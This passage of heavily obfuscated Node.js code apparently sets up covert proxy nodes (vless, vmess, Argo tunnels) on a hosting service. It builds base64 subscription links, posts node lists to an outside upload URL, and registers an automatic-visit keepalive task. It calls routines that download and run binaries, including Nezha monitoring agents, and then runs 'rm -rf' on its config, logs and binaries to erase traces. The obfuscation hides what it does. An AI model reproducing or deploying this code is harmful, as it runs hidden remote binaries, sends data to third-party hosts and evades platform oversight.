_0x295f3e={_0x481633:0x1c9,_0x146b26:0x1b9,_0x6fe422:0x173,_0x5cec4a:0x1e6,_0x33fabc:0x1b7,_0x2de4d1:0x13b,_0x381744:0x14f,_0x2d539f:0x169,_0x43e25f:0x185,_0x41af3d:0x1e1},_0xede1a1={_0x43dee6:0x14f,_0x1654df:0x186};setTimeout(()=>{const _0x39265a=_0x3995,_0x3d9cf7={'v':'2','ps':''+_0x1deb34,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x39265a(_0x295f3e._0x481633),'net':'ws','type':_0x39265a(0x1c9),'host':_0x134e95,'path':'/vmess-argo?ed=2560','tls':_0x39265a(0x172),'sni':_0x134e95,'alpn':'','fp':_0x39265a(0x13c)},_0x4695a9='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x39265a(_0x295f3e._0x146b26)+_0x134e95+_0x39265a(0x13b)+_0x134e95+_0x39265a(0x12f)+_0x1deb34+_0x39265a(_0x295f3e._0x6fe422)+Buffer['from'](JSON[_0x39265a(_0x295f3e._0x5cec4a)](_0x3d9cf7))[_0x39265a(0x169)](_0x39265a(0x1e2))+_0x39265a(0x193)+UUID+'@'+CFIP+':'+CFPORT+_0x39265a(_0x295f3e._0x33fabc)+_0x134e95+_0x39265a(_0x295f3e._0x2de4d1)+_0x134e95+_0x39265a(0x1de)+_0x1deb34+'\x0a\x20\x20\x20\x20';console[_0x39265a(0x185)](Buffer[_0x39265a(0x14f)](_0x4695a9)[_0x39265a(0x169)](_0x39265a(0x1e2))),fs['writeFileSync'](subPath,Buffer[_0x39265a(_0x295f3e._0x381744)](_0x4695a9)[_0x39265a(_0x295f3e._0x2d539f)](_0x39265a(0x1e2))),console[_0x39265a(_0x295f3e._0x43e25f)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x39265a(_0x295f3e._0x41af3d)]('/'+SUB_PATH,(_0x36afb5,_0x309579)=>{const _0x43cb8b=_0x39265a,_0x1f9a54=Buffer[_0x43cb8b(_0xede1a1._0x43dee6)](_0x4695a9)[_0x43cb8b(0x169)](_0x43cb8b(0x1e2));_0x309579[_0x43cb8b(0x15b)](_0x43cb8b(0x130),_0x43cb8b(_0xede1a1._0x1654df)),_0x309579[_0x43cb8b(0x174)](_0x1f9a54);}),_0xd9fd65(_0x4695a9);},0x7d0);});}}async function uploadNodes(){const _0x351473={_0x3e18ff:0x19c,_0x21fcc6:0x19a,_0x5e6742:0x1d2,_0x1e82d4:0x15e,_0x2a69b2:0x1b6,_0x2c4761:0x185},_0x4f3038=_0x462b9f;if(UPLOAD_URL&&PROJECT_URL){const _0x51571b=PROJECT_URL+'/'+SUB_PATH,_0x4fbeab={'subscription':[_0x51571b]};try{const _0x31980b=await axios['post'](UPLOAD_URL+_0x4f3038(_0x351473._0x3e18ff),_0x4fbeab,{'headers':{'Content-Type':_0x4f3038(_0x351473._0x21fcc6)}});return _0x31980b&&_0x31980b[_0x4f3038(0x1bc)]===0xc8?(console[_0x4f3038(0x185)]('Subscription\x20uploaded\x20successfully'),_0x31980b):null;}catch(_0x5a9e67){if(_0x5a9e67[_0x4f3038(0x1db)]){if(_0x5a9e67[_0x4f3038(0x1db)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x3ca2bb=fs[_0x4f3038(0x192)](listPath,_0x4f3038(_0x351473._0x5e6742)),_0x58c7ef=_0x3ca2bb[_0x4f3038(_0x351473._0x1e82d4)]('\x0a')[_0x4f3038(0x18b)](_0x53aaf5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x53aaf5));if(_0x58c7ef[_0x4f3038(0x145)]===0x0)return;const _0x4623a7=JSON[_0x4f3038(0x1e6)]({'nodes':_0x58c7ef});try{const _0x3a6279=await axios['post'](UPLOAD_URL+_0x4f3038(_0x351473._0x2a69b2),_0x4623a7,{'headers':{'Content-Type':_0x4f3038(_0x351473._0x21fcc6)}});return _0x3a6279&&_0x3a6279['status']===0xc8?(console[_0x4f3038(_0x351473._0x2c4761)](_0x4f3038(0x1a0)),_0x3a6279):null;}catch(_0xaf308d){return null;}}else return;}}function cleanFiles(){const _0x4d57f2={_0x460a2:0x144,_0x22cdde:0x1b0,_0x5017d6:0x156,_0x174961:0x15c};setTimeout(()=>{const _0xf02e74={_0x35741e:0x178,_0x21b7a4:0x1dd},_0x4932b0={_0x2984a4:0x178,_0x5a8cea:0x185},_0xb58b5d=_0x3995,_0x8045c2=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x8045c2[_0xb58b5d(0x1b2)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x8045c2['push'](phpPath);process[_0xb58b5d(_0x4d57f2._0x460a2)]==='win32'?exec(_0xb58b5d(_0x4d57f2._0x22cdde)+_0x8045c2[_0xb58b5d(_0x4d57f2._0x5017d6)]('\x20')+_0xb58b5d(_0x4d57f2._0x174961),_0x16ed40=>{const _0x30b79b=_0xb58b5d;console[_0x30b79b(_0x4932b0._0x2984a4)](),console[_0x30b79b(_0x4932b0._0x5a8cea)]('App\x20is\x20running'),console[_0x30b79b(0x185)](_0x30b79b(0x1dd));}):exec('rm\x20-rf\x20'+_0x8045c2[_0xb58b5d(_0x4d57f2._0x5017d6)]('\x20')+_0xb58b5d(0x17d),_0x397022=>{const _0x2ecc89=_0xb58b5d;console[_0x2ecc89(_0xf02e74._0x35741e)](),console[_0x2ecc89(0x185)]('App\x20is\x20running'),console[_0x2ecc89(0x185)](_0x2ecc89(_0xf02e74._0x21b7a4));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1be1d6={_0xd3ea0f:0x185,_0x19f8e2:0x179},_0x307595=_0x462b9f;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x31f429=await axios[_0x307595(0x1cc)](_0x307595(0x149),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x307595(0x19a)}});return console[_0x307595(_0x1be1d6._0xd3ea0f)](_0x307595(_0x1be1d6._0x19f8e2)),_0x31f429;}catch(_0x436925){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x436925[_0x307595(0x1c8)]),null;}}async function startserver(){const _0x3fe4cd={_0x152202:0x143,_0x168d4b:0x146},_0xd64d97=_0x462b9f;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x311920){console[_0xd64d97(_0x3fe4cd._0x152202)](_0xd64d97(_0x3fe4cd._0x168d4b),_0x311920);}}startserver()['catch'](_0x26052c=>{const _0x200ae8=_0x462b9f;console[_0x200ae8(0x143)]('Unhandled\x20error\x20in\x20startserver:',_0x26052c);}),app[_0x462b9f(0x18f)](PORT,()=>console['log'](_0x462b9f(0x19b)+PORT+'!'));
